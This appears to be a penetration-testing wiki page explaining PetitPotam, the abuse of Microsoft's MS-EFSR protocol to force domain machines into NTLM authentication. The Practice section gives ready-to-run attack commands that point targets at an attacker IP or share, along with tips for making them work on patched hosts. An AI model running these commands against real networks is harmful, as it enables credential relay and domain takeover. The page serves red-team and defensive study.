# MS-EFSR abuse (PetitPotam)

## Theory

MS-EFSR is Microsoft's Encrypting File System Remote protocol. It performs maintenance and management operations on encrypted data that is stored remotely and accessed over a network ([docs.microsoft.com](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-efsr)) and is available as an RPC interface. That interface is available through the `\pipe\efsrpc`, `\pipe\lsarpc`, `\pipe\samr`, `\pipe\lsass` and `\pipe\netlogon` SMB named pipes.

In 2019, Google's Project Zero research team found and reported a bug on MS-EFSR that could be combined with a [NTLM Reflection attack](https://bugs.chromium.org/p/project-zero/issues/detail?id=222) leading to a Local Privilege Elevation. An insufficient path check in MS-EFSR's `EfsRpcOpenFileRaw` method allowed attackers to force the `SYSTEM` account into creating an executable file of the attacker's choosing, hence providing the attacker with local admin rights.

While the wider implications of this bug, AD-DS-wise, were only suspected, in 2021, [Lionel GILLES](https://twitter.com/topotam77/status/1416833996923809793) used that bug to remotely coerce domain-joined machine's authentication. **The coerced authentications are made over SMB**. But MS-EFSR abuse can be combined with [WebClient abuse](webclient.md) to elicit incoming authentications made over HTTP which heightens [NTLM relay](../ntlm/relay.md) capabilities.

The following MS-EFSR's methods were detected vulnerable

* `EfsRpcOpenFileRaw` and `EfsRpcEncryptFileSrv` ([partially patched by Microsoft](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942))
* `EfsRpcEncryptFileSrv`, `EfsRpcDecryptFileSrv`, `EfsRpcQueryUsersOnFile`, `EfsRpcQueryRecoveryAgents`, `EfsRpcRemoveUsersFromFile`, `EfsRpcAddUsersToFile`, `EfsRpcFileKeyInfo`, `EfsRpcDuplicateEncryptionInfoFile`, `EfsRpcAddUsersToFileEx` (unpatched at the time of this article update, 29th December 2021)

## Practice

An authentication can be forced with the original author's proof-of-concepts dubbed "[PetitPotam](https://github.com/topotam/PetitPotam)" (available in C and Python) by using a valid AD account's credentials.

```bash
Petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP
```

An alternative Python implementation ([https://github.com/ly4k/PetitPotam](https://github.com/ly4k/PetitPotam)) can be used to exploit other unpatched methods that the original implementation doesn't feature.

```bash
petitpotam.py -method AddUsersToFile $TARGET_IP '\\$ATTACKER_IP\share\foo'
```

{% hint style="info" %}
**Nota bene**: coerced NTLM authentications made over SMB restrict the possibilities of [NTLM relay](../ntlm/relay.md). For instance, an "unsigning cross-protocols relay attack" from SMB to LDAP will only be possible if the target is vulnerable to CVE-2019-1040 or CVE-2019-1166.
{% endhint %}

{% hint style="success" %}
Some tests conducted in lab environments showed that, unlike the [MS-RPRN abuse (printbug)](ms-rprn.md), a NULL session could potentially be used to trigger that bug (if allowed by the target). This has only been verified to be working on on Windows Server 2016 and Windows Server 2019 Domain Controllers.

```bash
Petitpotam.py $ATTACKER_IP $TARGET_IP
```
{% endhint %}

{% hint style="success" %}
For the proof of concept to work, using a proper security provider (`RPC_C_AUTHN_WINNT`) and authentication level (`RPC_C_AUTHN_LEVEL_PKT_PRIVACY`) can be required, especially if the target is patched against MS-EFSR abuse (which doesn't completely mitigate the vulnerability). In both tools mentioned above, this is enabled by default only on topotam's one.
{% endhint %}

## Resources

{% embed url="https://www.exploit-db.com/exploits/47115" %}

{% embed url="https://github.com/topotam/PetitPotam" %}

{% embed url="https://github.com/ly4k/PetitPotam" %}
&#x20;
{% endembed %}

{% embed url="https://blog.compass-security.com/2020/05/relaying-ntlm-authentication-over-rpc" %}
Understand RPC better
{% endembed %}
